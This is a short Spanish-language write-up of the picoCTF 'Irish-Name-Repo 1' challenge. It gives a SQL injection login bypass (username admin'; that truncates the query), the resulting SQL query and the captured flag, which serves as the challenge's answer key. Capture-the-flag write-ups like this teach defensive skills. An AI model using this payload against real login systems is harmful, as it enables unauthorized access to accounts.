# Irish-Name-Repo 1
# Objetivos
Hay un sitio web en funcionamiento en `https://jupiter.challenges.picoctf.org/problem/52849/` ([enlace](https://jupiter.challenges.picoctf.org/problem/52849/)). Alguien ha omitido el inicio de sesión antes, y ahora se está fortaleciendo. ¡Intenta ver si aún puedes iniciar sesión! o http://jupiter.challenges.picoctf.org:52849

# Solucion
```bash
username: admin';
password: password
SQL query: SELECT * FROM users WHERE name='admin';' AND password='password'

# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_fa983901}
```

# Notas adicionales
Si se utiliza  '; en algún punto de la inyección el resto de las consultas se ignoraran 
# Referencias
https://www.w3schools.com/sql/sql_injection.asp